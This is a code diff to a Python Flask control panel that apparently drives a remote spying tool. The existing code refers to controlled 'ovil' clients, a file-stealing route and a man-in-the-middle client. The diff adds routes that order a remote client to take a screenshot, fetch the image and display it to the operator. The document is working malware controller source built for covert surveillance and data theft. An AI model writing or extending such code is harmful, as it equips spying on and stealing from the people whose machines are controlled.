@@ -14,7 +14,7 @@ from network.consts import Massages, UPLOAD_DEFAULT_PATH
 from consts import *
 from network import check_ip
 from network.client import Client
-from spying.consts import DEFAULT_AUDIO_NAME, DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_VIDEO_NAME
+from spying.consts import DEFAULT_AUDIO_NAME, DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_VIDEO_NAME, DEFAULT_SCREENSHOT_NAME
 from datetime import datetime
 
 
@@ -24,7 +24,7 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_DEFAULT_PATH
 # ovils: List[Client] = [Client("127.0.0.1"), Client("127.0.0.2"), Client("127.0.0.3"), Client("127.0.0.4"),
 #                        Client("127.0.0.5"), Client("127.0.0.6"), Client("127.0.0.7")]
 dynamic_mitm_ovil: Client | None = None
-
+screenshot_taken: List[bool | str] = [False, False, ""] # first indicates whether screenshot command sent and second mean if it succeded and third is the error msg
 
 ovils: List[Client] = []
 
@@ -527,6 +527,39 @@ def steal_file(ip):
         return error_msg
 
 
+@app.route("/ovil/<ip>/other_info/")
+@handle_errors
+def other_info(ip):
+    if screenshot_taken[0]:
+        if screenshot_taken[1]:
+            path = Path("uploads") / Path(find_last_file(UPLOAD_DEFAULT_PATH, prefix="screenshot")).name
+            path = "/" + str(path).replace("\\", "/")
+            screenshot_taken[0], screenshot_taken[1] = False, False
+            return render_template("other_info.html", screenshot=True, path=path)
+        screenshot_taken[0], screenshot_taken[1] = False, False
+        return render_template("other_info.html", screenshot=True, msg=screenshot_taken[2])
+    return render_template("other_info.html")
+
+
+@app.route("/ovil/<ip>/other_info/screenshot/")
+@handle_errors
+def screenshot(ip):
+    screenshot_taken[0] = True
+    screenshot_taken[1] = False
+    screenshot_taken[2] = take_screenshot(ip)
+    return redirect(url_for(f"other_info", ip=ip))
+
+@handle_errors
+@handle_disconnection
+def take_screenshot(ip) -> str:
+    ovil = ovils[ovils.index(ip)]
+    result = ovil.send_command("take_screenshot", [])
+    if not msg_to_bool(result):
+        if semi_msg_to_bool(result):
+            return result
+        return "Unknown Error"
+    screenshot_taken[1], msg = get_file(ovil, DEFAULT_SCREENSHOT_NAME)
+    return msg
 
 
 def main():
